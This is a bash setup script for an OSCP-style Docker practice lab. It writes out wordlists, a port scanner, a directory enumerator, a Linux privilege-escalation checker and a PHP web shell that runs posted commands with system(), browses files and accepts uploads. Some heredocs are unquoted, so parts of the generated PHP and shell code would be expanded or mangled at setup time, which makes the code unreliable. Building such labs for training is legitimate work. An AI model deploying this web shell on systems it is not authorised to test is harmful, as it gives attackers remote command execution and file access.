#!/bin/bash

# ANSI color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Print banner
echo -e "${BLUE}"
echo "======================================================"
echo "       OSCP Practical Tools - Environment Setup        "
echo "======================================================"
echo -e "${NC}"

# Check if Docker is installed
echo -e "${YELLOW}[*] Checking if Docker is installed...${NC}"
if ! command -v docker &> /dev/null; then
    echo -e "${RED}[!] Docker is not installed. Please install Docker first.${NC}"
    echo "    Visit https://docs.docker.com/get-docker/ for installation instructions."
    exit 1
fi

# Check if Docker Compose is installed
echo -e "${YELLOW}[*] Checking if Docker Compose is installed...${NC}"
if ! command -v docker-compose &> /dev/null; then
    echo -e "${RED}[!] Docker Compose is not installed. Please install Docker Compose first.${NC}"
    echo "    Visit https://docs.docker.com/compose/install/ for installation instructions."
    exit 1
fi

# Create necessary directories
echo -e "${YELLOW}[*] Creating necessary directories...${NC}"
mkdir -p scripts cheatsheets wordlists

# Create scripts directory structure
echo -e "${YELLOW}[*] Setting up scripts directory...${NC}"
mkdir -p scripts/recon scripts/exploitation scripts/post_exploitation

# Create wordlists directory structure
echo -e "${YELLOW}[*] Setting up wordlists directory...${NC}"
mkdir -p wordlists/directories wordlists/passwords wordlists/subdomains

# Download common wordlists
echo -e "${YELLOW}[*] Downloading common wordlists...${NC}"
if [ ! -f wordlists/directories/common.txt ]; then
    echo -e "${BLUE}[+] Downloading common directory wordlist...${NC}"
    curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/directories/common.txt
fi

if [ ! -f wordlists/passwords/top100.txt ]; then
    echo -e "${BLUE}[+] Creating sample password wordlist...${NC}"
    cat > wordlists/passwords/top100.txt << EOL
password
123456
12345678
admin
welcome
welcome1
Password1
password1
P@ssw0rd
qwerty
abc123
letmein
monkey
1234567
dragon
111111
baseball
iloveyou
trustno1
1234
sunshine
master
123123
shadow
shad0w
chelsea
football
princess
azerty
jennifer
bubbles
liverpool
purple
angel
jordan
killer
michelle
superman
batman
summer
winter
admin123
root
qwerty123
pass
EOL
fi

if [ ! -f wordlists/subdomains/common.txt ]; then
    echo -e "${BLUE}[+] Creating sample subdomain wordlist...${NC}"
    cat > wordlists/subdomains/common.txt << EOL
www
mail
remote
blog
webmail
server
ns1
ns2
smtp
secure
vpn
m
shop
ftp
mail2
test
portal
ns
ww1
host
support
dev
web
bbs
ww42
mx
email
cloud
1
mail1
2
forum
admin
vps
mx1
EOL
fi

# Create utility scripts
echo -e "${YELLOW}[*] Creating utility scripts...${NC}"

# Create port scanner script
cat > scripts/recon/port_scanner.py << EOL
#!/usr/bin/env python3
# Simple port scanner script

import socket
import sys
import threading
import time
from datetime import datetime

# Define colors
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
RED = '\033[0;31m'
NC = '\033[0m'  # No Color

def scan_port(target, port):
    """Scan a single port on the target"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            service = get_service_name(port)
            print(f"{GREEN}[+] Port {port} is open{NC} - {BLUE}{service}{NC}")
        s.close()
    except:
        pass

def get_service_name(port):
    """Return common service name for well-known ports"""
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        111: "RPC",
        135: "MSRPC",
        139: "NetBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1723: "PPTP",
        3306: "MySQL",
        3389: "RDP",
        5900: "VNC",
        8080: "HTTP-Proxy"
    }
    return common_ports.get(port, "Unknown")

def scan_target(target, ports):
    """Scan a target for open ports"""
    try:
        print(f"{YELLOW}[*] Scanning target: {target}{NC}")
        print(f"{YELLOW}[*] Time started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
        print("-" * 50)
        
        start_time = time.time()
        
        threads = []
        for port in ports:
            t = threading.Thread(target=scan_port, args=(target, port))
            threads.append(t)
            t.start()
            
            # Limit to 100 concurrent threads
            if len(threads) >= 100:
                for thread in threads:
                    thread.join()
                threads = []
        
        # Wait for remaining threads
        for thread in threads:
            thread.join()
            
        end_time = time.time()
        print("-" * 50)
        print(f"{BLUE}[*] Scan completed in {end_time - start_time:.2f} seconds{NC}")
        
    except KeyboardInterrupt:
        print(f"{RED}[!] Scan interrupted by user{NC}")
        sys.exit()
    except socket.gaierror:
        print(f"{RED}[!] Hostname could not be resolved{NC}")
        sys.exit()
    except socket.error:
        print(f"{RED}[!] Could not connect to server{NC}")
        sys.exit()

def main():
    """Main function"""
    print(f"{BLUE}{'=' * 60}")
    print("                 OSCP Port Scanner")
    print(f"{'=' * 60}{NC}")
    
    if len(sys.argv) < 2:
        print(f"{YELLOW}Usage: {sys.argv[0]} <target> [start_port] [end_port]{NC}")
        print(f"{YELLOW}Example: {sys.argv[0]} 192.168.100.10 1 1000{NC}")
        sys.exit()
    
    target = sys.argv[1]
    
    # Default port range
    start_port = 1
    end_port = 1000
    
    # Custom port range
    if len(sys.argv) >= 3:
        start_port = int(sys.argv[2])
    if len(sys.argv) >= 4:
        end_port = int(sys.argv[3])
    
    ports = range(start_port, end_port + 1)
    scan_target(target, ports)

if __name__ == "__main__":
    main()
EOL

# Create directory enumeration script
cat > scripts/recon/dir_enum.py << EOL
#!/usr/bin/env python3
# Directory enumeration script

import requests
import sys
import threading
import time
from datetime import datetime

# Define colors
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
RED = '\033[0;31m'
NC = '\033[0m'  # No Color

def check_directory(url, directory, extensions):
    """Check if a directory or file exists on the target"""
    try:
        # Check directory
        full_url = f"{url}/{directory}"
        response = requests.get(full_url, timeout=3)
        if response.status_code == 200:
            print(f"{GREEN}[+] Found: {full_url} (Status: {response.status_code}){NC}")
        elif response.status_code == 403:
            print(f"{YELLOW}[+] Found: {full_url} (Status: {response.status_code} - Forbidden){NC}")
        
        # Check with extensions
        for ext in extensions:
            if directory.endswith(f".{ext}"):
                continue
            ext_url = f"{url}/{directory}.{ext}"
            response = requests.get(ext_url, timeout=3)
            if response.status_code == 200:
                print(f"{GREEN}[+] Found: {ext_url} (Status: {response.status_code}){NC}")
            elif response.status_code == 403:
                print(f"{YELLOW}[+] Found: {ext_url} (Status: {response.status_code} - Forbidden){NC}")
    except requests.exceptions.RequestException:
        pass

def enumerate_directories(url, wordlist_file, extensions):
    """Enumerate directories on the target"""
    try:
        print(f"{YELLOW}[*] Starting directory enumeration on: {url}{NC}")
        print(f"{YELLOW}[*] Using wordlist: {wordlist_file}{NC}")
        print(f"{YELLOW}[*] Time started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
        print("-" * 60)
        
        start_time = time.time()
        
        # Read wordlist
        with open(wordlist_file, 'r') as f:
            directories = [line.strip() for line in f if line.strip()]
        
        threads = []
        for directory in directories:
            t = threading.Thread(target=check_directory, args=(url, directory, extensions))
            threads.append(t)
            t.start()
            
            # Limit to 20 concurrent threads
            if len(threads) >= 20:
                for thread in threads:
                    thread.join()
                threads = []
        
        # Wait for remaining threads
        for thread in threads:
            thread.join()
            
        end_time = time.time()
        print("-" * 60)
        print(f"{BLUE}[*] Enumeration completed in {end_time - start_time:.2f} seconds{NC}")
        
    except KeyboardInterrupt:
        print(f"{RED}[!] Enumeration interrupted by user{NC}")
        sys.exit()
    except FileNotFoundError:
        print(f"{RED}[!] Wordlist file not found: {wordlist_file}{NC}")
        sys.exit()

def main():
    """Main function"""
    print(f"{BLUE}{'=' * 60}")
    print("              OSCP Directory Enumerator")
    print(f"{'=' * 60}{NC}")
    
    if len(sys.argv) < 3:
        print(f"{YELLOW}Usage: {sys.argv[0]} <url> <wordlist> [extensions]{NC}")
        print(f"{YELLOW}Example: {sys.argv[0]} http://192.168.100.10 wordlists/directories/common.txt php,txt,html{NC}")
        sys.exit()
    
    url = sys.argv[1].rstrip('/')
    wordlist_file = sys.argv[2]
    
    # Default extensions
    extensions = ['php', 'html', 'txt']
    
    # Custom extensions
    if len(sys.argv) >= 4:
        extensions = sys.argv[3].split(',')
    
    enumerate_directories(url, wordlist_file, extensions)

if __name__ == "__main__":
    main()
EOL

# Create simple web shell
cat > scripts/exploitation/simple_webshell.php << EOL
<?php
// Simple PHP Web Shell
// OSCP Practical Tools Module

// Set password (change this in a real scenario)
\$password = "oscp";

// Authentication
\$authenticated = false;
if (isset(\$_POST['password']) && \$_POST['password'] === \$password) {
    \$authenticated = true;
    setcookie("auth", hash('sha256', \$password), time() + 3600);
} else if (isset(\$_COOKIE['auth']) && \$_COOKIE['auth'] === hash('sha256', \$password)) {
    \$authenticated = true;
}

// HTML header
echo "<!DOCTYPE html>
<html>
<head>
    <title>System Information</title>
    <style>
        body { font-family: monospace; background-color: #1a1a1a; color: #33ff33; margin: 0; padding: 20px; }
        h1 { color: #33ff33; }
        .container { background-color: #2a2a2a; padding: 20px; border-radius: 5px; }
        input[type=text], input[type=password] { background-color: #333; color: #33ff33; border: 1px solid #33ff33; padding: 5px; width: 100%; }
        input[type=submit] { background-color: #333; color: #33ff33; border: 1px solid #33ff33; padding: 5px 10px; cursor: pointer; }
        pre { background-color: #333; padding: 10px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class='container'>
        <h1>System Information</h1>";

// Login form if not authenticated
if (!$authenticated) {
    echo "<form method='post'>
        <input type='password' name='password' placeholder='Password'>
        <input type='submit' value='Login'>
    </form>";
} else {
    // System information
    echo "<h2>Server Information</h2>";
    echo "<pre>";
    echo "Server: " . \$_SERVER['SERVER_SOFTWARE'] . "\n";
    echo "PHP Version: " . phpversion() . "\n";
    echo "User: " . get_current_user() . "\n";
    echo "OS: " . php_uname() . "\n";
    echo "</pre>";
    
    // Command execution
    echo "<h2>Command Execution</h2>";
    echo "<form method='post'>
        <input type='text' name='cmd' placeholder='Command'>
        <input type='submit' value='Execute'>
    </form>";
    
    if (isset(\$_POST['cmd'])) {
        echo "<pre>";
        \$cmd = \$_POST['cmd'];
        system(\$cmd);
        echo "</pre>";
    }
    
    // File browser
    echo "<h2>File Browser</h2>";
    echo "<form method='post'>
        <input type='text' name='dir' value='" . (isset(\$_POST['dir']) ? htmlspecialchars(\$_POST['dir']) : getcwd()) . "'>
        <input type='submit' value='Browse'>
    </form>";
    
    if (isset(\$_POST['dir'])) {
        echo "<pre>";
        \$dir = \$_POST['dir'];
        if (is_dir(\$dir)) {
            if (\$handle = opendir(\$dir)) {
                while (false !== (\$entry = readdir(\$handle))) {
                    \$file_type = is_dir(\$dir . '/' . \$entry) ? "DIR" : "FILE";
                    echo sprintf("%-5s %s\n", \$file_type, \$entry);
                }
                closedir(\$handle);
            }
        } else {
            echo "Not a valid directory";
        }
        echo "</pre>";
    }
    
    // File upload
    echo "<h2>File Upload</h2>";
    echo "<form method='post' enctype='multipart/form-data'>
        <input type='file' name='uploaded_file'>
        <input type='text' name='upload_path' value='" . (isset(\$_POST['upload_path']) ? htmlspecialchars(\$_POST['upload_path']) : getcwd()) . "'>
        <input type='submit' value='Upload'>
    </form>";
    
    if (isset(\$_FILES['uploaded_file'])) {
        \$upload_path = isset(\$_POST['upload_path']) ? \$_POST['upload_path'] : getcwd();
        \$target_file = \$upload_path . '/' . basename(\$_FILES['uploaded_file']['name']);
        
        if (move_uploaded_file(\$_FILES['uploaded_file']['tmp_name'], \$target_file)) {
            echo "<pre>File uploaded to: " . htmlspecialchars(\$target_file) . "</pre>";
        } else {
            echo "<pre>Upload failed</pre>";
        }
    }
}

echo "</div></body></html>";
?>
EOL

# Create privilege escalation checker script
cat > scripts/post_exploitation/linux_privesc_check.sh << EOL
#!/bin/bash
# Simple Linux Privilege Escalation Checker
# OSCP Practical Tools Module

# ANSI color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Print banner
echo -e "${BLUE}"
echo "======================================================"
echo "       Linux Privilege Escalation Checker              "
echo "======================================================"
echo -e "${NC}"

# System information
echo -e "${YELLOW}[*] System Information${NC}"
echo -e "${BLUE}[+] Hostname:${NC} $(hostname)"
echo -e "${BLUE}[+] Kernel:${NC} $(uname -a)"
echo -e "${BLUE}[+] OS:${NC} $(cat /etc/issue 2>/dev/null || cat /etc/*-release 2>/dev/null | head -n 1 || echo "Unknown")"
echo -e "${BLUE}[+] Architecture:${NC} $(arch)"

# User information
echo -e "\n${YELLOW}[*] User Information${NC}"
echo -e "${BLUE}[+] Current user:${NC} $(whoami)"
echo -e "${BLUE}[+] Current user ID:${NC} $(id)"
echo -e "${BLUE}[+] Users with login:${NC}"
grep -v -E "nologin|false" /etc/passwd | cut -d ":" -f 1

# Sudo access
echo -e "\n${YELLOW}[*] Sudo Access${NC}"
echo -e "${BLUE}[+] Sudo version:${NC} $(sudo -V | head -n 1 2>/dev/null || echo "Sudo not found")"
echo -e "${BLUE}[+] Sudo privileges:${NC}"
sudo -l 2>/dev/null || echo "No sudo privileges or sudo requires password"

# SUID binaries
echo -e "\n${YELLOW}[*] SUID Binaries${NC}"
echo -e "${BLUE}[+] SUID binaries:${NC}"
find / -perm -4000 -type f 2>/dev/null | grep -v "snap" | head -n 20

# Writable files
echo -e "\n${YELLOW}[*] Writable Files${NC}"
echo -e "${BLUE}[+] Writable /etc files:${NC}"
find /etc -writable -type f 2>/dev/null | head -n 10
echo -e "${BLUE}[+] Writable directories:${NC}"
find / -writable -type d 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | grep -v "^/dev" | grep -v "^/run" | head -n 10

# Cron jobs
echo -e "\n${YELLOW}[*] Cron Jobs${NC}"
echo -e "${BLUE}[+] System crontab:${NC}"
cat /etc/crontab 2>/dev/null || echo "No system crontab or permission denied"
echo -e "${BLUE}[+] Cron jobs:${NC}"
ls -la /etc/cron* 2>/dev/null || echo "No cron jobs found or permission denied"

# Network information
echo -e "\n${YELLOW}[*] Network Information${NC}"
echo -e "${BLUE}[+] Network interfaces:${NC}"
ip a 2>/dev/null || ifconfig 2>/dev/null || echo "No network tools found"
echo -e "${BLUE}[+] Listening ports:${NC}"
netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null || echo "No netstat or ss found"

# Running processes
echo -e "\n${YELLOW}[*] Running Processes${NC}"
echo -e "${BLUE}[+] Processes running as root:${NC}"
ps aux | grep "^root" | head -n 10

# Installed applications
echo -e "\n${YELLOW}[*] Installed Applications${NC}"
echo -e "${BLUE}[+] Installed packages:${NC}"
dpkg -l 2>/dev/null | grep -E "^ii" | head -n 10 || rpm -qa 2>/dev/null | head -n 10 || echo "No package manager found"

echo -e "\n${YELLOW}[*] Scan completed. Check the output for potential privilege escalation vectors.${NC}"
EOL

# Make scripts executable
echo -e "${YELLOW}[*] Making scripts executable...${NC}"
chmod +x scripts/recon/port_scanner.py
chmod +x scripts/recon/dir_enum.py
chmod +x scripts/post_exploitation/linux_privesc_check.sh

# Start Docker environment
echo -e "${YELLOW}[*] Starting Docker environment...${NC}"
docker-compose up -d

# Print usage instructions
echo -e "${GREEN}[+] Environment setup completed!${NC}"
echo -e "${BLUE}"
echo "======================================================"
echo "                   Usage Instructions                  "
echo "======================================================"
echo -e "${NC}"
echo -e "${YELLOW}1. Connect to the Kali container:${NC}"
echo "   docker exec -it kali_attack bash"
echo ""
echo -e "${YELLOW}2. Available targets:${NC}"
echo "   - Ubuntu Web Server: 192.168.100.10"
echo "   - Metasploitable: 192.168.100.20"
echo "   - DVWA: 192.168.100.30"
echo "   - OWASP Juice Shop: 192.168.100.40"
echo "   - Vulnerable Windows: 192.168.100.50"
echo ""
echo -e "${YELLOW}3. Available scripts:${NC}"
echo "   - Port Scanner: /opt/scripts/recon/port_scanner.py"
echo "   - Directory Enumerator: /opt/scripts/recon/dir_enum.py"
echo "   - Linux Privilege Escalation Checker: /opt/scripts/post_exploitation/linux_privesc_check.sh"
echo ""
echo -e "${YELLOW}4. Stop the environment:${NC}"
echo "   docker-compose down"
echo ""
echo -e "${BLUE}Happy hacking!${NC}"
